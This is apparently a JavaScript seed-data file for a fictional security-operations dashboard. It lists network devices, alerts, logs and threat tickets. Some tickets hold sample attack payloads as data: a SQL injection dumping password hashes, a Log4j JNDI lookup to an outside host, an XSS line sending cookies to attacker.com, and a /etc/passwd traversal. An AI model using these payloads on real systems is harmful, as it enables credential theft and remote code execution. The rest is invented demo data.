// Seed data matching Enterprise SOC NIDS Engine v4.2

export const SEED_USERS = [
  { id: 1, name: "Alex Vance", email: "alex.vance@securenet.ai", role: "Administrator", avatar: "AV" },
  { id: 2, name: "Sarah Jenkins", email: "sarah.jenkins@securenet.ai", role: "Network Security Analyst", avatar: "SJ" },
  { id: 3, name: "Corporate Employee", email: "employee.vance@securenet.ai", role: "Employee", avatar: "CE" },
];

export const SEED_METRIC_CARDS = [
  {
    title: "Monitoring Status",
    value: "NIDS Active",
    subtext: "Suricata 7.0 Engine • 38,400 Signatures",
    badge: "ONLINE",
    badgeType: "healthy",
    status: "healthy"
  },
  {
    title: "Packets Captured",
    value: "1,482,910",
    subtext: "840 Mbps • Promiscuous Ring Capture",
    badge: "14.2k PPS",
    badgeType: "info",
    status: "info"
  },
  {
    title: "Total Threats",
    value: "14",
    subtext: "2 Active • 12 Resolved",
    badge: "2 Active",
    badgeType: "warning",
    status: "warning"
  },
  {
    title: "Critical Threats",
    value: "2",
    subtext: "SQLi & DNS DDoS Under Active Triage",
    badge: "ACTION REQ",
    badgeType: "critical",
    status: "critical"
  },
  {
    title: "Perimeter Firewall",
    value: "HA Active / Online",
    subtext: "Palo Alto PA-5250 • 128 Rules Sync",
    badge: "WARNING",
    badgeType: "warning",
    status: "warning"
  },
  {
    title: "Router Gateway",
    value: "HEALTHY (0.4ms)",
    subtext: "Cisco Catalyst 9500 • BGP Synchronized",
    badge: "0.4ms LAT",
    badgeType: "healthy",
    status: "healthy"
  },
  {
    title: "App Server Cluster",
    value: "99.99% UPTIME",
    subtext: "K8s Node 04 • 34% CPU • 58% RAM",
    badge: "HEALTHY",
    badgeType: "healthy",
    status: "healthy"
  },
  {
    title: "Database Host",
    value: "High Load",
    subtext: "PostgreSQL 15 • 89% CPU • 92% RAM",
    badge: "SQLi ALERT",
    badgeType: "critical",
    status: "critical"
  },
  {
    title: "Incident Resolution",
    value: "85.7% Rate",
    subtext: "12 Resolved • Avg Resolution: 6m 12s",
    badge: "OPTIMAL",
    badgeType: "healthy",
    status: "healthy"
  }
];

export const SEED_NODES = [
  {
    id: "internet",
    name: "Internet (WAN)",
    ip: "0.0.0.0/0",
    type: "WAN Gateway",
    status: "healthy",
    mac: "52:54:00:12:34:56",
    vendor: "Tier 1 Transit ISP",
    model: "BGP Gateway Core",
    os: "Carrier Grade BGP OS",
    cpu_usage: 14,
    ram_usage: 28,
    throughput: "10.2 Gbps",
    interfaces: [{ name: "wan0", ip: "198.51.100.1/24", status: "UP" }],
    ports: [{ port: 179, proto: "TCP", service: "BGP" }],
    details: { asn: 64512, peers: 4, latency: "1.2ms" },
    x: 130,
    y: 190
  },
  {
    id: "firewall",
    name: "Palo Alto FW",
    ip: "192.168.1.1",
    type: "NextGen Firewall",
    status: "warning",
    mac: "00:1B:17:00:01:01",
    vendor: "Palo Alto Networks",
    model: "PA-5250 (Warning)",
    os: "PAN-OS 11.0.2-h3",
    cpu_usage: 54,
    ram_usage: 68,
    throughput: "4.8 Gbps",
    interfaces: [
      { name: "eth0", ip: "198.51.100.2", alias: "WAN" },
      { name: "eth1", ip: "192.168.1.1", alias: "LAN" },
      { name: "eth2", ip: "10.0.0.1", alias: "DMZ" },
      { name: "eth3", ip: "172.16.1.1", alias: "HA Sync" }
    ],
    ports: [
      { port: 443, proto: "TCP", service: "Management Web UI" },
      { port: 22, proto: "TCP", service: "Admin SSH" }
    ],
    details: { state: "Active/Passive HA Online", rules_sync: 128, active_sessions: 34820 },
    x: 255,
    y: 190
  },
  {
    id: "router",
    name: "Cisco Core Router",
    ip: "192.168.1.254",
    type: "Layer 3 Router",
    status: "healthy",
    mac: "00:2A:6A:11:22:33",
    vendor: "Cisco Systems",
    model: "Catalyst 9500-48Y4C",
    os: "Cisco IOS XE 17.09.03a",
    cpu_usage: 28,
    ram_usage: 42,
    throughput: "18.4 Gbps",
    interfaces: [
      { name: "Te1/0/1", ip: "192.168.1.254/24", status: "UP" },
      { name: "Te1/0/2", ip: "10.0.0.254/16", status: "UP" }
    ],
    ports: [{ port: 22, proto: "TCP", service: "SSH" }],
    details: { routing_latency: "0.4ms", mtu: 1500, bgp_sync: true },
    x: 380,
    y: 190
  },
  {
    id: "switch",
    name: "Arista Core Switch",
    ip: "192.168.1.2",
    type: "Managed Switch",
    status: "healthy",
    mac: "00:1C:73:A0:B1:C2",
    vendor: "Arista Networks",
    model: "7050SX3-48YC8",
    os: "EOS 4.30.1F",
    cpu_usage: 18,
    ram_usage: 32,
    throughput: "920 Mbps",
    interfaces: [
      { name: "Port 1-24", speed: "10GbE", status: "UP" },
      { name: "Uplink 49-52", speed: "100GbE", status: "UP" }
    ],
    ports: [{ port: 161, proto: "UDP", service: "SNMPv3" }],
    details: { active_ports: 20, vlans: [10, 20, 30, 99] },
    x: 505,
    y: 190
  },
  {
    id: "db-server",
    name: "PostgreSQL DB Host",
    ip: "192.168.1.50",
    type: "Database Server",
    status: "critical",
    mac: "00:50:56:A1:B2:C3",
    vendor: "Dell EMC PowerEdge",
    model: "R750xs Dual Xeon",
    os: "Ubuntu 22.04 LTS (PostgreSQL 15)",
    cpu_usage: 89,
    ram_usage: 92,
    throughput: "410 Mbps",
    interfaces: [{ name: "ens192", ip: "192.168.1.50/24", status: "UP" }],
    ports: [
      { port: 5432, proto: "TCP", service: "PostgreSQL" },
      { port: 22, proto: "TCP", service: "SSH" }
    ],
    details: { alert: "SQL Injection & High Query Execution Spikes", max_conn: 500, current_conn: 482 },
    x: 650,
    y: 65
  },
  {
    id: "app-server",
    name: "App Cluster Node",
    ip: "192.168.1.60",
    type: "Application Server",
    status: "healthy",
    mac: "00:50:56:B2:C3:D4",
    vendor: "HPE ProLiant",
    model: "DL380 Gen10",
    os: "Debian 12 (K8s Worker Node 04)",
    cpu_usage: 34,
    ram_usage: 58,
    throughput: "680 Mbps",
    interfaces: [{ name: "ens224", ip: "192.168.1.60/24", status: "UP" }],
    ports: [
      { port: 443, proto: "TCP", service: "HTTPS Nginx" },
      { port: 80, proto: "TCP", service: "HTTP" },
      { port: 8000, proto: "TCP", service: "FastAPI Core" }
    ],
    details: { uptime: "99.99%", pods: 14, cluster: "k8s-prod-cluster-01" },
    x: 650,
    y: 145
  },
  {
    id: "ids",
    name: "Suricata NIDS Probe",
    ip: "192.168.1.100",
    type: "Security Sensor",
    status: "healthy",
    mac: "00:0C:29:14:25:36",
    vendor: "Custom Appliance",
    model: "SOC NIDS Engine 1U",
    os: "Alpine Linux 3.19 (Suricata 7.0)",
    cpu_usage: 22,
    ram_usage: 44,
    throughput: "1.8 Gbps",
    interfaces: [
      { name: "eth0", ip: "192.168.1.100/24", alias: "MGMT" },
      { name: "mon0", ip: "0.0.0.0", alias: "SPAN / Mirror Port" }
    ],
    ports: [{ port: 9000, proto: "TCP", service: "EveBox UI" }],
    details: { active_rules: 38400, drops: 0, pkts_analyzed: 1482910 },
    x: 650,
    y: 230
  },
  {
    id: "pcs",
    name: "Workstations Subnet",
    ip: "192.168.1.0/24",
    type: "Client Subnet",
    status: "warning",
    mac: "Multiple",
    vendor: "Enterprise Clients",
    model: "VLAN 10 Corporate Workstations",
    os: "Windows 11 / macOS Sonoma",
    cpu_usage: 48,
    ram_usage: 62,
    throughput: "340 Mbps",
    interfaces: [{ name: "vlan10", subnet: "192.168.1.0/24", status: "UP" }],
    ports: [{ port: 445, proto: "TCP", service: "SMB" }, { port: 53, proto: "UDP", service: "DNS" }],
    details: { active_endpoints: 94, anomalous_outbound: true },
    x: 650,
    y: 310
  }
];

export const SEED_THREATS = [
  {
    id: 1,
    ticket_id: "TRT-2026-8801",
    severity: "Critical",
    attack_vector: "SQL Injection (UNION SELECT Exfiltration)",
    source_ip: "185.220.101.45",
    destination_host: "192.168.1.50 (db-server)",
    status: "Active",
    raw_payload: "GET /api/v1/users?id=1' UNION SELECT username, password_hash FROM admin_users-- HTTP/1.1\nHost: db.securenet.corp\nUser-Agent: sqlmap/1.7.2#stable",
    timestamp: "2026-09-05T18:52:00Z"
  },
  {
    id: 2,
    ticket_id: "TRT-2026-8802",
    severity: "Critical",
    attack_vector: "DNS Amplification DDoS (12.4 Gbps Flood)",
    source_ip: "45.142.214.12",
    destination_host: "192.168.1.254 (router)",
    status: "Active",
    raw_payload: "DNS IN ANY isc.org +edns=0 +bufsize=4096 (12.4 Gbps reflection flood across 14,000 requests/sec)",
    timestamp: "2026-09-05T18:38:00Z"
  },
  {
    id: 3,
    ticket_id: "TRT-2026-8798",
    severity: "High",
    attack_vector: "SSH Brute Force Authentication Attack",
    source_ip: "192.168.1.142",
    destination_host: "192.168.1.60 (app-server)",
    status: "Investigating",
    raw_payload: "SSH-2.0-OpenSSH_8.9p1 invalid user root; repeated 42 attempts/sec from internal workstation subnet",
    timestamp: "2026-09-05T17:45:00Z"
  },
  {
    id: 4,
    ticket_id: "TRT-2026-8780",
    severity: "Medium",
    attack_vector: "Stealth SYN Port Scanning (Nmap Probe)",
    source_ip: "103.251.170.8",
    destination_host: "192.168.1.1 (firewall)",
    status: "Resolved",
    raw_payload: "TCP [SYN] Seq=0 Win=1024 Len=0 MSS=1460 SACK_PERM TSval=19488 TSecr=0\nProbe target ports: 1-1024",
    timestamp: "2026-09-05T15:35:00Z",
    action_taken: "Blocked Source IP on Perimeter Firewall",
    admin_notes: "Source subnet added to automatic threat blackhole list.",
    resolved_by: "Alex Vance",
    resolved_at: "2026-09-05T15:40:00Z"
  },
  {
    id: 5,
    ticket_id: "TRT-2026-8772",
    severity: "High",
    attack_vector: "Log4j JNDI Remote Code Execution Probe",
    source_ip: "194.26.29.112",
    destination_host: "192.168.1.60 (app-server)",
    status: "Resolved",
    raw_payload: "${jndi:ldap://194.26.29.112:1389/Exploit}",
    timestamp: "2026-09-05T12:55:00Z",
    action_taken: "Blocked Source IP on Perimeter Firewall",
    admin_notes: "Mitigated by WAF rule #101.",
    resolved_by: "Sarah Jenkins",
    resolved_at: "2026-09-05T13:05:00Z"
  },
  {
    id: 6,
    ticket_id: "TRT-2026-8765",
    severity: "Low",
    attack_vector: "ICMP Echo Flood Diagnostic Scan",
    source_ip: "89.208.103.24",
    destination_host: "192.168.1.254 (router)",
    status: "Resolved",
    raw_payload: "ICMP echo request, id 0x1f2e, seq 1, length 64",
    timestamp: "2026-09-05T10:55:00Z",
    action_taken: "Rate Limited ICMP traffic",
    admin_notes: "Normal automated network test probe.",
    resolved_by: "Alex Vance",
    resolved_at: "2026-09-05T11:00:00Z"
  },
  {
    id: 7,
    ticket_id: "TRT-2026-8758",
    severity: "Medium",
    attack_vector: "Cross-Site Scripting (XSS In Polyglot)",
    source_ip: "195.154.255.7",
    destination_host: "192.168.1.60 (app-server)",
    status: "Resolved",
    raw_payload: "<script>fetch('http://attacker.com/cookie?c='+document.cookie)</script>",
    timestamp: "2026-09-05T07:55:00Z",
    action_taken: "Terminated Active Suspicious TCP Session",
    admin_notes: "XSS sanitized at reverse proxy layer.",
    resolved_by: "Sarah Jenkins",
    resolved_at: "2026-09-05T08:10:00Z"
  },
  {
    id: 8,
    ticket_id: "TRT-2026-8749",
    severity: "Low",
    attack_vector: "SSL/TLS Weak Cipher Negotiation Attempt",
    source_ip: "185.191.171.14",
    destination_host: "192.168.1.60 (app-server)",
    status: "Resolved",
    raw_payload: "ClientHello TLS 1.0 Cipher: TLS_RSA_WITH_3DES_EDE_CBC_SHA",
    timestamp: "2026-09-05T04:55:00Z",
    action_taken: "Enforced TLS 1.3 Strict Policy",
    admin_notes: "Deprecated cipher suites rejected by default.",
    resolved_by: "Alex Vance",
    resolved_at: "2026-09-05T05:05:00Z"
  },
  {
    id: 9,
    ticket_id: "TRT-2026-8738",
    severity: "High",
    attack_vector: "SMB Lateral Movement Probe (EternalBlue Heuristic)",
    source_ip: "192.168.1.188",
    destination_host: "192.168.1.50 (db-server)",
    status: "Resolved",
    raw_payload: "SMB2 Trans2 Negotiate Protocol Request (Anomalous dialect probe)",
    timestamp: "2026-09-05T00:55:00Z",
    action_taken: "Isolated Target Endpoint Machine",
    admin_notes: "Endpoint VLAN quarantined; antivirus scan cleared.",
    resolved_by: "Sarah Jenkins",
    resolved_at: "2026-09-05T01:25:00Z"
  },
  {
    id: 10,
    ticket_id: "TRT-2026-8725",
    severity: "Medium",
    attack_vector: "DNS Tunneling Data Exfiltration",
    source_ip: "192.168.1.105",
    destination_host: "198.51.100.1 (WAN)",
    status: "Resolved",
    raw_payload: "TXT query: a8f9c1b72e8174.tunnel.c2server.net",
    timestamp: "2026-09-04T20:55:00Z",
    action_taken: "Blocked Source IP on Perimeter Firewall",
    admin_notes: "C2 domain sinkholed in internal resolver.",
    resolved_by: "Alex Vance",
    resolved_at: "2026-09-04T21:15:00Z"
  },
  {
    id: 11,
    ticket_id: "TRT-2026-8712",
    severity: "Low",
    attack_vector: "SNMP Community String Guessing (Public)",
    source_ip: "77.88.55.66",
    destination_host: "192.168.1.2 (switch)",
    status: "Resolved",
    raw_payload: "SNMPv1 GetRequest community='public' oid=1.3.6.1.2.1.1.1.0",
    timestamp: "2026-09-04T16:55:00Z",
    action_taken: "Blocked Source IP on Perimeter Firewall",
    admin_notes: "External SNMP disabled.",
    resolved_by: "Sarah Jenkins",
    resolved_at: "2026-09-04T17:54:00Z"
  },
  {
    id: 12,
    ticket_id: "TRT-2026-8701",
    severity: "Medium",
    attack_vector: "FTP Anonymous Login Scan",
    source_ip: "46.101.12.80",
    destination_host: "192.168.1.60 (app-server)",
    status: "Resolved",
    raw_payload: "USER anonymous PASS guest@securenet.ai",
    timestamp: "2026-09-04T12:55:00Z",
    action_taken: "Terminated Active Suspicious TCP Session",
    admin_notes: "Port 21 closed.",
    resolved_by: "Alex Vance",
    resolved_at: "2026-09-04T13:50:00Z"
  },
  {
    id: 13,
    ticket_id: "TRT-2026-8690",
    severity: "High",
    attack_vector: "Directory Traversal (/etc/passwd Access)",
    source_ip: "212.102.40.19",
    destination_host: "192.168.1.60 (app-server)",
    status: "Resolved",
    raw_payload: "GET /public/download?file=../../../../etc/passwd HTTP/1.1",
    timestamp: "2026-09-04T06:55:00Z",
    action_taken: "Blocked Source IP on Perimeter Firewall",
    admin_notes: "Input validation patch applied in app container.",
    resolved_by: "Sarah Jenkins",
    resolved_at: "2026-09-04T07:45:00Z"
  },
  {
    id: 14,
    ticket_id: "TRT-2026-8680",
    severity: "Low",
    attack_vector: "NTP Monlist Amplification Probe",
    source_ip: "91.240.118.15",
    destination_host: "192.168.1.254 (router)",
    status: "Resolved",
    raw_payload: "NTP v2 monlist request mode 7",
    timestamp: "2026-09-04T00:55:00Z",
    action_taken: "Terminated Active Suspicious TCP Session",
    admin_notes: "NTP monlist disabled router-wide.",
    resolved_by: "Alex Vance",
    resolved_at: "2026-09-04T01:50:00Z"
  }
];

export const SEED_FIREWALL_RULES = [
  {
    id: 1,
    rule_number: 101,
    name: "Block-Malicious-Blackhole",
    direction: "Inbound",
    source_subnet: "185.220.101.0/24",
    dest_subnet: "Any",
    protocol: "ALL",
    action: "DROP",
    hits: 14820,
    is_active: true
  },
  {
    id: 2,
    rule_number: 102,
    name: "Allow-HTTPS-Public",
    direction: "Inbound",
    source_subnet: "Any",
    dest_subnet: "192.168.1.60",
    protocol: "TCP (443)",
    action: "ACCEPT",
    hits: 984120,
    is_active: true
  },
  {
    id: 3,
    rule_number: 103,
    name: "Allow-SSH-Admin-VLAN",
    direction: "Inbound",
    source_subnet: "192.168.1.0/24",
    dest_subnet: "192.168.1.50",
    protocol: "TCP (22)",
    action: "ACCEPT",
    hits: 4120,
    is_active: true
  },
  {
    id: 4,
    rule_number: 104,
    name: "Block-Outbound-Cryptomining",
    direction: "Outbound",
    source_subnet: "192.168.1.0/24",
    dest_subnet: "Any",
    protocol: "TCP (3333/4444/9999)",
    action: "DROP",
    hits: 890,
    is_active: true
  }
];

export const SEED_ALERTS = [
  {
    id: 1,
    alert_id: "ALT-9901",
    title: "Critical SQL Injection Signature Triggered",
    severity: "critical",
    description: "Suricata SID: 2010992 - UNION SELECT pattern detected against Primary Database host.",
    asset: "db-server (192.168.1.50)",
    timestamp: "2026-09-05T18:52:00Z",
    is_acknowledged: false
  },
  {
    id: 2,
    alert_id: "ALT-9902",
    title: "High Inbound UDP Volume on Gateway",
    severity: "critical",
    description: "Traffic spike exceeding 12 Gbps threshold on Cisco Catalyst interface Te1/0/1.",
    asset: "router (192.168.1.254)",
    timestamp: "2026-09-05T18:38:00Z",
    is_acknowledged: false
  },
  {
    id: 3,
    alert_id: "ALT-9903",
    title: "Repeated SSH Authentication Failures",
    severity: "warning",
    description: "Workstation IP 192.168.1.142 initiated 42 failed auth attempts against App Server.",
    asset: "app-server (192.168.1.60)",
    timestamp: "2026-09-05T17:45:00Z",
    is_acknowledged: false
  },
  {
    id: 4,
    alert_id: "ALT-9904",
    title: "NIDS Rule Definition Database Updated",
    severity: "info",
    description: "Suricata engine updated with 240 new emerging threat signatures (total: 38,400).",
    asset: "ids (192.168.1.100)",
    timestamp: "2026-09-05T16:55:00Z",
    is_acknowledged: true
  }
];

export const SEED_PACKETS = [
  {
    id: 1,
    frame_id: 1482910,
    timestamp: "18:55:01.214",
    src_ip: "185.220.101.45",
    src_port: 51240,
    dst_ip: "192.168.1.50",
    dst_port: 5432,
    protocol: "TCP",
    length: 1420,
    status: "BLOCKED",
    flags: "[PSH, ACK]",
    payload_hex: "47 45 54 20 2f 61 70 69 2f 76 31 2f 75 73 65 72 73 3f 69 64 3d 31 27 20 55 4e 49 4f 4e 20 53 45 4c 45 43 54 20 75 73 65 72 6e 61 6d 65 2c 20 70 61 73 73 77 6f 72 64 5f 68 61 73 68 20 46 52 4f 4d 20 61 64 6d 69 6e 5f 75 73 65 72 73 2d 2d",
    payload_ascii: "GET /api/v1/users?id=1' UNION SELECT username, password_hash FROM admin_users--"
  },
  {
    id: 2,
    frame_id: 1482909,
    timestamp: "18:55:00.892",
    src_ip: "45.142.214.12",
    src_port: 53,
    dst_ip: "192.168.1.254",
    dst_port: 53,
    protocol: "UDP",
    length: 4096,
    status: "RATE_LIMITED",
    flags: "[DNS-ANY]",
    payload_hex: "00 01 81 80 00 01 00 0e 00 04 00 04 03 69 73 63 03 6f 72 67 00 00 ff 00 01",
    payload_ascii: "...isc.org..ANY reflection payload flood [4096 bytes]"
  },
  {
    id: 3,
    frame_id: 1482908,
    timestamp: "18:54:59.102",
    src_ip: "192.168.1.142",
    src_port: 44812,
    dst_ip: "192.168.1.60",
    dst_port: 22,
    protocol: "TCP",
    length: 104,
    status: "PASSED",
    flags: "[SYN]",
    payload_hex: "53 53 48 2d 32 2e 30 2d 4f 70 65 6e 53 53 48 5f 38 2e 39 70 31 20 55 62 75 6e 74 75",
    payload_ascii: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"
  },
  {
    id: 4,
    frame_id: 1482907,
    timestamp: "18:54:58.441",
    src_ip: "192.168.1.60",
    src_port: 443,
    dst_ip: "198.51.100.88",
    dst_port: 59124,
    protocol: "HTTP/S",
    length: 1280,
    status: "PASSED",
    flags: "[ACK]",
    payload_hex: "17 03 03 04 e0 00 00 00 00 00 00 00 01 3a 4f 8c 91 2b 7e",
    payload_ascii: "TLSv1.3 Application Data [Encrypted Session]"
  },
  {
    id: 5,
    frame_id: 1482906,
    timestamp: "18:54:57.900",
    src_ip: "103.251.170.8",
    src_port: 61099,
    dst_ip: "192.168.1.1",
    dst_port: 80,
    protocol: "TCP",
    length: 64,
    status: "BLOCKED",
    flags: "[SYN]",
    payload_hex: "00 00 00 00 00 00 00 00 00 00 00 00 08 00 45 00 00 3c",
    payload_ascii: "TCP Stealth Probe [Nmap SYN Scan]"
  }
];

export const SEED_LOGS = [
  {
    id: 1,
    timestamp: "2026-09-05 18:55:01",
    level: "CRITICAL",
    device: "ids",
    component: "Suricata-NIDS",
    message: "Alert SID:2010992 - ET EXPLOIT PostgreSQL SQL Injection UNION SELECT attack detected.",
    raw_json: '{"sid": 2010992, "src": "185.220.101.45", "dst": "192.168.1.50", "category": "Web Application Attack"}'
  },
  {
    id: 2,
    timestamp: "2026-09-05 18:54:12",
    level: "WARNING",
    device: "firewall",
    component: "PAN-OS-Session",
    message: "High connection rate on interface eth1: 42 connections/sec from 192.168.1.142.",
    raw_json: '{"device": "PA-5250", "event": "RateLimitWarning", "threshold": 30}'
  },
  {
    id: 3,
    timestamp: "2026-09-05 18:50:00",
    level: "INFO",
    device: "router",
    component: "BGP-Core",
    message: "BGP Neighbor 198.51.100.1 state changed to ESTABLISHED. Prefixes received: 842,910.",
    raw_json: '{"neighbor": "198.51.100.1", "state": "ESTABLISHED", "as": 64512}'
  },
  {
    id: 4,
    timestamp: "2026-09-05 18:48:33",
    level: "INFO",
    device: "app-server",
    component: "Nginx-Gateway",
    message: "SSL Handshake successful TLSv1.3 TLS_AES_256_GCM_SHA384 client 198.51.100.88.",
    raw_json: '{"protocol": "TLSv1.3", "cipher": "TLS_AES_256_GCM_SHA384", "status": 200}'
  }
];

export const SEED_ROUTER_DATA = {
  device: "Cisco Catalyst 9500-48Y4C",
  hostname: "core-gw-cisco-01.securenet.corp",
  uptime: "142 days, 18 hours, 32 mins",
  firmware: "Cisco IOS XE 17.09.03a",
  routing_latency_ms: 0.38,
  bgp_status: "Established (AS 64512)",
  active_ports_count: 19,
  total_ports_count: 24,
  throughput_gbps: 18.4,
  ports: Array.from({ length: 24 }, (_, idx) => {
    const portNum = idx + 1;
    const isActive = ![7, 13, 19, 21, 23].includes(portNum);
    return {
      port: portNum,
      name: `Te1/0/${portNum}`,
      status: isActive ? "UP" : "DOWN",
      speed: isActive ? ([1, 2, 3, 4, 24].includes(portNum) ? "10G Full" : "1G Full") : "N/A",
      vlan: portNum <= 12 ? 10 : (portNum <= 20 ? 20 : 99),
      tx_mbps: isActive ? Number(((portNum * 37.4) % 850).toFixed(1)) : 0.0,
      rx_mbps: isActive ? Number(((portNum * 42.1) % 920).toFixed(1)) : 0.0,
      errors: portNum === 5 ? 3 : 0
    };
  }),
  routes: [
    { destination: "0.0.0.0/0", gateway: "192.168.1.1", netmask: "0.0.0.0", flags: "UG", interface: "Gig0/0 (WAN)" },
    { destination: "192.168.1.0/24", gateway: "0.0.0.0", netmask: "255.255.255.0", flags: "U", interface: "VLAN 10 (LAN)" },
    { destination: "10.0.0.0/16", gateway: "192.168.1.254", netmask: "255.255.0.0", flags: "UG", interface: "VLAN 20 (DMZ)" },
    { destination: "172.16.0.0/12", gateway: "192.168.1.2", netmask: "255.240.0.0", flags: "U", interface: "VLAN 30 (Servers)" },
    { destination: "127.0.0.1/32", gateway: "0.0.0.0", netmask: "255.255.255.255", flags: "UH", interface: "lo0" }
  ]
};
